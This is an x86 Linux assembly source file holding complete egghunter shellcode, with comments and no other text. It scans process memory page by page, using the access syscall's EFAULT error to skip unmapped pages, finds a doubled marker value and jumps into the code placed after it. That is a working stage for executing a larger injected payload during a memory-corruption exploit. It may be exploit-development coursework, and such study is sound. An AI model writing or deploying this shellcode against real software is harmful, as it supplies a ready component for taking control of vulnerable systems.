global _start
section .text
_start:
	xor edx,edx
	mov ebx, 0x09050505  ; token
	xor ecx,ecx
	mul ecx
	incPage:
	or dx, 0xfff
	incMemory:
	inc edx	
	pushad ; push all the general purpose registers on the stack	
	xor ebx,ebx
	lea ebx, [edx+4]
    ; access system call returns EFAULT if pathname points outside your accessible address space
	mov al, 33 ; access system call
	int 0x80

	cmp al,0xf2 ; EFAULT
	popad ; pop all the general purpose regsiters
	jz  incPage ;move to next page
	
	
    ; token will be present on the consective positions in the memory
	cmp ebx, [edx]   ; looking for the first token
	jnz incMemory 
	
	cmp ebx, [edx+4] ; looking for the  token
	jnz incMemory
	
	xor eax,eax
    xor ebx, ebx
	xor ecx,ecx
	add edx,8 ; once found the token jmp to position after both tokens
	jmp edx 	
